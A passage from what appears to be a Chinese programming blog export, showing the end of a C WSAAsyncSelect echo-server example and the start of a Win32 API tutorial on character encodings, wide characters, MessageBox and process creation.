class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建窗口</span></span><br><span class="line">    hwnd = CreateWindow(<span class="string">&quot;WSAAsyncSelectExample&quot;</span>, <span class="string">&quot;WSAAsyncSelect Example&quot;</span>, WS_OVERLAPPEDWINDOW,</span><br><span class="line">                        CW_USEDEFAULT, <span class="number">0</span>, CW_USEDEFAULT, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!hwnd) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateWindow failed: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ShowWindow(hwnd, nCmdShow);</span><br><span class="line">    UpdateWindow(hwnd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建socket</span></span><br><span class="line">    <span class="keyword">if</span> ((server_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) == INVALID_SOCKET) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;socket failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绑定socket</span></span><br><span class="line">    address.sin_family = AF_INET;</span><br><span class="line">    address.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    address.sin_port = htons(PORT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bind(server_fd, (<span class="keyword">struct</span> sockaddr *)&amp;address, <span class="keyword">sizeof</span>(address)) == SOCKET_ERROR) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bind failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 监听</span></span><br><span class="line">    <span class="keyword">if</span> (listen(server_fd, <span class="number">3</span>) == SOCKET_ERROR) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;listen failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置WSAAsyncSelect</span></span><br><span class="line">    <span class="keyword">if</span> (WSAAsyncSelect(server_fd, hwnd, WM_SOCKET, FD_ACCEPT | FD_READ | FD_CLOSE) == SOCKET_ERROR) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAAsyncSelect failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 消息循环</span></span><br><span class="line">    <span class="keyword">while</span> (GetMessage(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">        TranslateMessage(&amp;msg);</span><br><span class="line">        DispatchMessage(&amp;msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    closesocket(server_fd);</span><br><span class="line">    WSACleanup();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="type">int</span>)msg.wParam;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WndProc</span><span class="params">(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)</span> &#123;</span><br><span class="line">    SOCKET client_fd;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">1024</span>];</span><br><span class="line">    <span class="type">int</span> iResult;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (msg) &#123;</span><br><span class="line">        <span class="keyword">case</span> WM_SOCKET:</span><br><span class="line">            <span class="keyword">if</span> (WSAGETSELECTERROR(lParam)) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Socket error: %d\n&quot;</span>, WSAGETSELECTERROR(lParam));</span><br><span class="line">                closesocket((SOCKET)wParam);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> (WSAGETSELECTEVENT(lParam)) &#123;</span><br><span class="line">                <span class="keyword">case</span> FD_ACCEPT:</span><br><span class="line">                    <span class="comment">// 接受新连接</span></span><br><span class="line">                    client_fd = accept((SOCKET)wParam, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">                    <span class="keyword">if</span> (client_fd == INVALID_SOCKET) &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;accept failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">// 为新连接的socket设置WSAAsyncSelect</span></span><br><span class="line">                        <span class="keyword">if</span> (WSAAsyncSelect(client_fd, hwnd, WM_SOCKET, FD_READ | FD_CLOSE) == SOCKET_ERROR) &#123;</span><br><span class="line">                            <span class="built_in">printf</span>(<span class="string">&quot;WSAAsyncSelect failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">                            closesocket(client_fd);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> FD_READ:</span><br><span class="line">                    <span class="comment">// 读取数据</span></span><br><span class="line">                    iResult = recv((SOCKET)wParam, buffer, <span class="keyword">sizeof</span>(buffer), <span class="number">0</span>);</span><br><span class="line">                    <span class="keyword">if</span> (iResult &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        buffer[iResult] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;Received: %s\n&quot;</span>, buffer);</span><br><span class="line">                        send((SOCKET)wParam, buffer, iResult, <span class="number">0</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (iResult == <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;Connection closed\n&quot;</span>);</span><br><span class="line">                        closesocket((SOCKET)wParam);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;recv failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">                        closesocket((SOCKET)wParam);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> FD_CLOSE:</span><br><span class="line">                    <span class="comment">// 连接关闭</span></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Connection closed\n&quot;</span>);</span><br><span class="line">                    closesocket((SOCKET)wParam);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">            <span class="comment">// 窗口关闭消息</span></span><br><span class="line">            PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> DefWindowProc(hwnd, msg, wParam, lParam);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>Cpp</tag>
        <tag>Internet Programming</tag>
      </tags>
  </entry>
  <entry>
    <title>Win32API</title>
    <url>/2024/07/05/Win32API/</url>
    <content><![CDATA[<h1 id="Win32API"><a href="#Win32API" class="headerlink" title="Win32API"></a>Win32API</h1><span id="more"></span>

<h2 id="字符编码"><a href="#字符编码" class="headerlink" title="字符编码"></a>字符编码</h2><h3 id="ASCII-码表"><a href="#ASCII-码表" class="headerlink" title="ASCII 码表"></a>ASCII 码表</h3><table>
<thead>
<tr>
<th><strong>ASCII值</strong></th>
<th><strong>控制字符</strong></th>
<th><strong>ASCII值</strong></th>
<th><strong>控制字符</strong></th>
<th><strong>ASCII值</strong></th>
<th><strong>控制字符</strong></th>
<th><strong>ASCII值</strong></th>
<th><strong>控制字符</strong></th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>NUL</td>
<td>32</td>
<td>(space)</td>
<td>64</td>
<td>@</td>
<td>96</td>
<td>、</td>
</tr>
<tr>
<td>1</td>
<td>SOH</td>
<td>33</td>
<td>！</td>
<td>65</td>
<td>A</td>
<td>97</td>
<td>a</td>
</tr>
<tr>
<td>2</td>
<td>STX</td>
<td>34</td>
<td>”</td>
<td>66</td>
<td>B</td>
<td>98</td>
<td>b</td>
</tr>
<tr>
<td>3</td>
<td>ETX</td>
<td>35</td>
<td>#</td>
<td>67</td>
<td>C</td>
<td>99</td>
<td>c</td>
</tr>
<tr>
<td>4</td>
<td>EOT</td>
<td>36</td>
<td>$</td>
<td>68</td>
<td>D</td>
<td>100</td>
<td>d</td>
</tr>
<tr>
<td>5</td>
<td>ENQ</td>
<td>37</td>
<td>%</td>
<td>69</td>
<td>E</td>
<td>101</td>
<td>e</td>
</tr>
<tr>
<td>6</td>
<td>ACK</td>
<td>38</td>
<td>&amp;</td>
<td>70</td>
<td>F</td>
<td>102</td>
<td>f</td>
</tr>
<tr>
<td>7</td>
<td>BEL</td>
<td>39</td>
<td>‘</td>
<td>71</td>
<td>G</td>
<td>103</td>
<td>g</td>
</tr>
<tr>
<td>8</td>
<td>BS</td>
<td>40</td>
<td>(</td>
<td>72</td>
<td>H</td>
<td>104</td>
<td>h</td>
</tr>
<tr>
<td>9</td>
<td>HT</td>
<td>41</td>
<td>)</td>
<td>73</td>
<td>I</td>
<td>105</td>
<td>i</td>
</tr>
<tr>
<td>10</td>
<td>LF</td>
<td>42</td>
<td>*</td>
<td>74</td>
<td>J</td>
<td>106</td>
<td>j</td>
</tr>
<tr>
<td>11</td>
<td>VT</td>
<td>43</td>
<td>+</td>
<td>75</td>
<td>K</td>
<td>107</td>
<td>k</td>
</tr>
<tr>
<td>12</td>
<td>FF</td>
<td>44</td>
<td>,</td>
<td>76</td>
<td>L</td>
<td>108</td>
<td>l</td>
</tr>
<tr>
<td>13</td>
<td>CR</td>
<td>45</td>
<td>-</td>
<td>77</td>
<td>M</td>
<td>109</td>
<td>m</td>
</tr>
<tr>
<td>14</td>
<td>SO</td>
<td>46</td>
<td>.</td>
<td>78</td>
<td>N</td>
<td>110</td>
<td>n</td>
</tr>
<tr>
<td>15</td>
<td>SI</td>
<td>47</td>
<td>&#x2F;</td>
<td>79</td>
<td>O</td>
<td>111</td>
<td>o</td>
</tr>
<tr>
<td>16</td>
<td>DLE</td>
<td>48</td>
<td>0</td>
<td>80</td>
<td>P</td>
<td>112</td>
<td>p</td>
</tr>
<tr>
<td>17</td>
<td>DCI</td>
<td>49</td>
<td>1</td>
<td>81</td>
<td>Q</td>
<td>113</td>
<td>q</td>
</tr>
<tr>
<td>18</td>
<td>DC2</td>
<td>50</td>
<td>2</td>
<td>82</td>
<td>R</td>
<td>114</td>
<td>r</td>
</tr>
<tr>
<td>19</td>
<td>DC3</td>
<td>51</td>
<td>3</td>
<td>83</td>
<td>X</td>
<td>115</td>
<td>s</td>
</tr>
<tr>
<td>20</td>
<td>DC4</td>
<td>52</td>
<td>4</td>
<td>84</td>
<td>T</td>
<td>116</td>
<td>t</td>
</tr>
<tr>
<td>21</td>
<td>NAK</td>
<td>53</td>
<td>5</td>
<td>85</td>
<td>U</td>
<td>117</td>
<td>u</td>
</tr>
<tr>
<td>22</td>
<td>SYN</td>
<td>54</td>
<td>6</td>
<td>86</td>
<td>V</td>
<td>118</td>
<td>v</td>
</tr>
<tr>
<td>23</td>
<td>TB</td>
<td>55</td>
<td>7</td>
<td>87</td>
<td>W</td>
<td>119</td>
<td>w</td>
</tr>
<tr>
<td>24</td>
<td>CAN</td>
<td>56</td>
<td>8</td>
<td>88</td>
<td>X</td>
<td>120</td>
<td>x</td>
</tr>
<tr>
<td>25</td>
<td>EM</td>
<td>57</td>
<td>9</td>
<td>89</td>
<td>Y</td>
<td>121</td>
<td>y</td>
</tr>
<tr>
<td>26</td>
<td>SUB</td>
<td>58</td>
<td>:</td>
<td>90</td>
<td>Z</td>
<td>122</td>
<td>z</td>
</tr>
<tr>
<td>27</td>
<td>ESC</td>
<td>59</td>
<td>;</td>
<td>91</td>
<td>[</td>
<td>123</td>
<td>{</td>
</tr>
<tr>
<td>28</td>
<td>FS</td>
<td>60</td>
<td>&lt;</td>
<td>92</td>
<td>\</td>
<td>124</td>
<td>|</td>
</tr>
<tr>
<td>29</td>
<td>GS</td>
<td>61</td>
<td>&#x3D;</td>
<td>93</td>
<td>]</td>
<td>125</td>
<td>}</td>
</tr>
<tr>
<td>30</td>
<td>RS</td>
<td>62</td>
<td>&gt;</td>
<td>94</td>
<td>^</td>
<td>126</td>
<td>~</td>
</tr>
<tr>
<td>31</td>
<td>US</td>
<td>63</td>
<td>?</td>
<td>95</td>
<td>—</td>
<td>127</td>
<td>DEL</td>
</tr>
</tbody></table>
<h3 id="ASCII扩展码表"><a href="#ASCII扩展码表" class="headerlink" title="ASCII扩展码表"></a>ASCII扩展码表</h3><table>
<thead>
<tr>
<th><strong>十进制</strong></th>
<th><strong>十六进制</strong></th>
<th><strong>字符</strong></th>
<th><strong>十进制</strong></th>
<th><strong>十六进制</strong></th>
<th><strong>字符</strong></th>
</tr>
</thead>
<tbody><tr>
<td>128</td>
<td>80</td>
<td>Ç</td>
<td>192</td>
<td>C0</td>
<td>└</td>
</tr>
<tr>
<td>129</td>
<td>81</td>
<td>ü</td>
<td>193</td>
<td>C1</td>
<td>┴</td>
</tr>
<tr>
<td>130</td>
<td>82</td>
<td>é</td>
<td>194</td>
<td>C2</td>
<td>┬</td>
</tr>
<tr>
<td>131</td>
<td>83</td>
<td>â</td>
<td>195</td>
<td>C3</td>
<td>├</td>
</tr>
<tr>
<td>132</td>
<td>84</td>
<td>ä</td>
<td>196</td>
<td>C4</td>
<td>─</td>
</tr>
<tr>
<td>133</td>
<td>85</td>
<td>à</td>
<td>197</td>
<td>C5</td>
<td>┼</td>
</tr>
<tr>
<td>134</td>
<td>86</td>
<td>å</td>
<td>198</td>
<td>C6</td>
<td>╞</td>
</tr>
<tr>
<td>135</td>
<td>87</td>
<td>ç</td>
<td>199</td>
<td>C7</td>
<td>╟</td>
</tr>
<tr>
<td>136</td>
<td>88</td>
<td>ê</td>
<td>200</td>
<td>C8</td>
<td>╚</td>
</tr>
<tr>
<td>137</td>
<td>89</td>
<td>ë</td>
<td>201</td>
<td>C9</td>
<td>╔</td>
</tr>
<tr>
<td>138</td>
<td>8A</td>
<td>è</td>
<td>202</td>
<td>CA</td>
<td>╩</td>
</tr>
<tr>
<td>139</td>
<td>8B</td>
<td>ï</td>
<td>203</td>
<td>CB</td>
<td>╦</td>
</tr>
<tr>
<td>140</td>
<td>8C</td>
<td>î</td>
<td>204</td>
<td>CC</td>
<td>╠</td>
</tr>
<tr>
<td>141</td>
<td>8D</td>
<td>ì</td>
<td>205</td>
<td>CD</td>
<td>═</td>
</tr>
<tr>
<td>142</td>
<td>8E</td>
<td>Ä</td>
<td>206</td>
<td>CE</td>
<td>╬</td>
</tr>
<tr>
<td>143</td>
<td>8F</td>
<td>Å</td>
<td>207</td>
<td>CF</td>
<td>╧</td>
</tr>
<tr>
<td>144</td>
<td>90</td>
<td>É</td>
<td>208</td>
<td>D0</td>
<td>╨</td>
</tr>
<tr>
<td>145</td>
<td>91</td>
<td>æ</td>
<td>209</td>
<td>D1</td>
<td>╤</td>
</tr>
<tr>
<td>146</td>
<td>92</td>
<td>Æ</td>
<td>210</td>
<td>D2</td>
<td>╥</td>
</tr>
<tr>
<td>147</td>
<td>93</td>
<td>ô</td>
<td>211</td>
<td>D3</td>
<td>╙</td>
</tr>
<tr>
<td>148</td>
<td>94</td>
<td>ö</td>
<td>212</td>
<td>D4</td>
<td>Ô</td>
</tr>
<tr>
<td>149</td>
<td>95</td>
<td>ò</td>
<td>213</td>
<td>D5</td>
<td>╒</td>
</tr>
<tr>
<td>150</td>
<td>96</td>
<td>û</td>
<td>214</td>
<td>D6</td>
<td>╓</td>
</tr>
<tr>
<td>151</td>
<td>97</td>
<td>ù</td>
<td>215</td>
<td>D7</td>
<td>╫</td>
</tr>
<tr>
<td>152</td>
<td>98</td>
<td>ÿ</td>
<td>216</td>
<td>D8</td>
<td>╪</td>
</tr>
<tr>
<td>153</td>
<td>99</td>
<td>Ö</td>
<td>217</td>
<td>D9</td>
<td>┘</td>
</tr>
<tr>
<td>154</td>
<td>9A</td>
<td>Ü</td>
<td>218</td>
<td>DA</td>
<td>┌</td>
</tr>
<tr>
<td>155</td>
<td>9B</td>
<td>¢</td>
<td>219</td>
<td>DB</td>
<td>█</td>
</tr>
<tr>
<td>156</td>
<td>9C</td>
<td>£</td>
<td>220</td>
<td>DC</td>
<td>▄</td>
</tr>
<tr>
<td>157</td>
<td>9D</td>
<td>¥</td>
<td>221</td>
<td>DD</td>
<td>▌</td>
</tr>
<tr>
<td>158</td>
<td>9E</td>
<td>?</td>
<td>222</td>
<td>DE</td>
<td>?</td>
</tr>
<tr>
<td>159</td>
<td>9F</td>
<td>ƒ</td>
<td>223</td>
<td>DF</td>
<td>?</td>
</tr>
<tr>
<td>160</td>
<td>A0</td>
<td>á</td>
<td>224</td>
<td>E0</td>
<td>α</td>
</tr>
<tr>
<td>161</td>
<td>A1</td>
<td>í</td>
<td>225</td>
<td>E1</td>
<td>ß</td>
</tr>
<tr>
<td>162</td>
<td>A2</td>
<td>ó</td>
<td>226</td>
<td>E2</td>
<td>Γ</td>
</tr>
<tr>
<td>163</td>
<td>A3</td>
<td>ú</td>
<td>227</td>
<td>E3</td>
<td>π</td>
</tr>
<tr>
<td>164</td>
<td>A4</td>
<td>ñ</td>
<td>228</td>
<td>E4</td>
<td>Σ</td>
</tr>
<tr>
<td>165</td>
<td>A5</td>
<td>Ñ</td>
<td>229</td>
<td>E5</td>
<td>σ</td>
</tr>
<tr>
<td>166</td>
<td>A6</td>
<td>ª</td>
<td>230</td>
<td>E6</td>
<td>µ</td>
</tr>
<tr>
<td>167</td>
<td>A7</td>
<td>º</td>
<td>231</td>
<td>E7</td>
<td>τ</td>
</tr>
<tr>
<td>168</td>
<td>A8</td>
<td>¿</td>
<td>232</td>
<td>E8</td>
<td>Φ</td>
</tr>
<tr>
<td>169</td>
<td>A9</td>
<td>?</td>
<td>233</td>
<td>E9</td>
<td>Θ</td>
</tr>
<tr>
<td>170</td>
<td>AA</td>
<td>¬</td>
<td>234</td>
<td>EA</td>
<td>Ω</td>
</tr>
<tr>
<td>171</td>
<td>AB</td>
<td>½</td>
<td>235</td>
<td>EB</td>
<td>δ</td>
</tr>
<tr>
<td>172</td>
<td>AC</td>
<td>¼</td>
<td>236</td>
<td>EC</td>
<td>∞</td>
</tr>
<tr>
<td>173</td>
<td>AD</td>
<td>¡</td>
<td>237</td>
<td>ED</td>
<td>φ</td>
</tr>
<tr>
<td>174</td>
<td>AE</td>
<td>«</td>
<td>238</td>
<td>EE</td>
<td>ε</td>
</tr>
<tr>
<td>175</td>
<td>AF</td>
<td>»</td>
<td>239</td>
<td>EF</td>
<td>∩</td>
</tr>
<tr>
<td>176</td>
<td>B0</td>
<td>?</td>
<td>240</td>
<td>F0</td>
<td>≡</td>
</tr>
<tr>
<td>177</td>
<td>B1</td>
<td>?</td>
<td>241</td>
<td>F1</td>
<td>±</td>
</tr>
<tr>
<td>178</td>
<td>B2</td>
<td>▓</td>
<td>242</td>
<td>F2</td>
<td>≥</td>
</tr>
<tr>
<td>179</td>
<td>B3</td>
<td>│</td>
<td>243</td>
<td>F3</td>
<td>≤</td>
</tr>
<tr>
<td>180</td>
<td>B4</td>
<td>┤</td>
<td>244</td>
<td>F4</td>
<td>?</td>
</tr>
<tr>
<td>181</td>
<td>B5</td>
<td>╡</td>
<td>245</td>
<td>F5</td>
<td>?</td>
</tr>
<tr>
<td>182</td>
<td>B6</td>
<td>╢</td>
<td>246</td>
<td>F6</td>
<td>÷</td>
</tr>
<tr>
<td>183</td>
<td>B7</td>
<td>╖</td>
<td>247</td>
<td>F7</td>
<td>≈</td>
</tr>
<tr>
<td>184</td>
<td>B8</td>
<td>╕</td>
<td>248</td>
<td>F8</td>
<td>≈</td>
</tr>
<tr>
<td>185</td>
<td>B9</td>
<td>╣</td>
<td>249</td>
<td>F9</td>
<td>?</td>
</tr>
<tr>
<td>186</td>
<td>BA</td>
<td>║</td>
<td>250</td>
<td>FA</td>
<td>·</td>
</tr>
<tr>
<td>187</td>
<td>BB</td>
<td>╗</td>
<td>251</td>
<td>FB</td>
<td>√</td>
</tr>
<tr>
<td>188</td>
<td>BC</td>
<td>╝</td>
<td>252</td>
<td>FC</td>
<td>?</td>
</tr>
<tr>
<td>189</td>
<td>BD</td>
<td>╜</td>
<td>253</td>
<td>FD</td>
<td>²</td>
</tr>
<tr>
<td>190</td>
<td>BE</td>
<td>╛</td>
<td>FE</td>
<td>■</td>
<td></td>
</tr>
<tr>
<td>191</td>
<td>BF</td>
<td>┐</td>
<td>255</td>
<td>FF</td>
<td>ÿ</td>
</tr>
</tbody></table>
<h3 id="Unicode字符集"><a href="#Unicode字符集" class="headerlink" title="Unicode字符集"></a>Unicode字符集</h3><p>UNICODE编码方案，世界上所有的文字符号都能从这张表中找到。Unicode编码范围是0~0x10FFFF，能容纳1114111个字符。</p>
<p>但是Unicode只是一个字符集，它规定了每个字符对应的二进制，但是没有规定如何存储。</p>
<p>Unicode的存储方式有UTF-8和UTF-16</p>
<h4 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h4><p>UTF-8是变长字符编码。</p>
<table>
<thead>
<tr>
<th>Unicode编码（HEX）</th>
<th>UTF-8字节流（BIN）</th>
</tr>
</thead>
<tbody><tr>
<td>000000 - 00007F</td>
<td>0xxxxxxx</td>
</tr>
<tr>
<td>000080 - 0007FF</td>
<td>110xxxxx 10xxxxxx</td>
</tr>
<tr>
<td>000800 - 00FFFF</td>
<td>1110xxxx 10xxxxxx 10xxxxxx</td>
</tr>
<tr>
<td>010000 - 10FFFF</td>
<td>11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</td>
</tr>
</tbody></table>
<h4 id="UTF-16"><a href="#UTF-16" class="headerlink" title="UTF-16"></a>UTF-16</h4><p>UTF-16编码以16位无符号整数为单位，（是以16位为一个单位，不表示一个字符就有16位）。这要看字符的Unicode编码处于什么范围而定，有可能是2个字节，有可能是4个字节。现在机器上的Unicode编码一般指的是UTF-16编码</p>
<h3 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h3><p>BOM，BYTE Order Mark，字符排列标志。</p>
<table>
<thead>
<tr>
<th>编码方式</th>
<th>BOM</th>
</tr>
</thead>
<tbody><tr>
<td>UTF-8</td>
<td>EF BB BF</td>
</tr>
<tr>
<td>UTF-16LE（小端对齐</td>
<td>FF FE</td>
</tr>
<tr>
<td>UTF-16BE（大端对齐</td>
<td>FE FF</td>
</tr>
</tbody></table>
<h3 id="C语言中的宽字符"><a href="#C语言中的宽字符" class="headerlink" title="C语言中的宽字符"></a>C语言中的宽字符</h3><h4 id="宽字符"><a href="#宽字符" class="headerlink" title="宽字符"></a>宽字符</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">wchar_t</span> wch[] = <span class="string">&quot;宽字符&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>打印宽字符：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;locale.h&gt;</span>				<span class="comment">//添加头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	setlocale(LC_ALL, <span class="string">&quot;&quot;</span>);		<span class="comment">// 控制台使用默认编码</span></span><br><span class="line">	<span class="type">wchar_t</span> wch[] = <span class="string">L&quot;宽字符&quot;</span>;</span><br><span class="line">	wprintf(<span class="string">L&quot;%s\n&quot;</span>, wch);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h4><table>
<thead>
<tr>
<th>char</th>
<th>wchar_t</th>
<th>多字节字符型 &#x2F; 宽字节字符型</th>
</tr>
</thead>
<tbody><tr>
<td>printf</td>
<td>wprintf</td>
<td>打印到控制台</td>
</tr>
<tr>
<td>strlen</td>
<td>wcslen</td>
<td>获取长度</td>
</tr>
<tr>
<td>strcpy</td>
<td>wcscpy</td>
<td>字符串复制</td>
</tr>
<tr>
<td>strcat</td>
<td>wcscat</td>
<td>字符串拼接</td>
</tr>
<tr>
<td>strcmp</td>
<td>wcscmp</td>
<td>字符串比较</td>
</tr>
<tr>
<td>strstr</td>
<td>wcsstr</td>
<td>字符串查找</td>
</tr>
</tbody></table>
<h3 id="Win32-API中的宽字符"><a href="#Win32-API中的宽字符" class="headerlink" title="Win32 API中的宽字符"></a>Win32 API中的宽字符</h3><h4 id="Win32-API"><a href="#Win32-API" class="headerlink" title="Win32 API"></a>Win32 API</h4><p>API，Application Process Interface应用程序接口，也就是Windows提供的封装好的一些函数</p>
<p>几个重要DLL：</p>
<p>&lt;1&gt;Kernel32.dll最核心的功能模块，比如管理内存、进程和线程相关的函数等。<br>&lt;2&gt;User32.dll是Vindows用户界面相关应用程序接口，如创建窗口和发送消息等。<br>&lt;3&gt;GDl32.dll全称是Graphical Device Interface(图形设备接口)，包含用于画图和显示文本的函数。</p>
<p>在Win32中写代码最好用TCHAR来写，利于跨平台使用</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CHAR ch[] = <span class="string">&quot;&quot;</span>;				<span class="comment">//char</span></span><br><span class="line">WCHAR wch[] = <span class="string">L&quot;&quot;</span>;			<span class="comment">//wchar_t</span></span><br><span class="line"></span><br><span class="line">TCHAR tch[] = TEXT(<span class="string">&quot;&quot;</span>);		<span class="comment">// 依赖于程序默认的编码，是ASCII就是ASCII，是Unicode就是Unicode</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">指针类型</span><br><span class="line">PSTR pszStr = <span class="string">&quot;&quot;</span>;				<span class="comment">//char*</span></span><br><span class="line">PWSTR pwszStr = <span class="string">L&quot;&quot;</span>;			<span class="comment">//wchar_t*</span></span><br><span class="line"></span><br><span class="line">PTSTR ptszStr = TEXT(<span class="string">&quot;&quot;</span>);		<span class="comment">//兼容</span></span><br></pre></td></tr></table></figure>

<h4 id="MessageBox-API"><a href="#MessageBox-API" class="headerlink" title="MessageBox API"></a>MessageBox API</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CHAR chTitle[] = <span class="string">&quot;标题&quot;</span>;</span><br><span class="line">CHAR chText[] = <span class="string">&quot;内容&quot;</span>;</span><br><span class="line">MessageBoxA(<span class="number">0</span>,chText,chTitle,MB_YESNO);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">WCHAR wchTitle[] = <span class="string">L&quot;标题&quot;</span>;</span><br><span class="line">WCHAR wchText[] = <span class="string">L&quot;内容&quot;</span>;</span><br><span class="line">MessageBoxW(<span class="number">0</span>,wchText,wchTitle,MB_YESNO);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TCHAR chTitle[] = TEXT(<span class="string">&quot;标题&quot;</span>);</span><br><span class="line">TCHAR chText[] = TEXT(<span class="string">&quot;内容&quot;</span>);</span><br><span class="line">MessageBox(<span class="number">0</span>,chText,chTitle,MB_YESNO);</span><br></pre></td></tr></table></figure>

<h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><h3 id="进程的创建"><a href="#进程的创建" class="headerlink" title="进程的创建"></a>进程的创建</h3><p>任何进程都是别的进程创建的：由CreateProcess()这个函数创建</p>
<p>进程创建过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、映射EXE文件</span><br><span class="line">2、创建内核对象EPROCESS</span><br><span class="line">3、映射系统DLL(ntdll.dll)</span><br><span class="line">4、创建线程内核对象ETHREAD</span><br><span class="line">5、系统启动线程</span><br><span class="line">		映射DLL(ntdl.LdrInitializeThunk)</span><br><span class="line">		线程开始执行</span><br></pre></td></tr></table></figure>

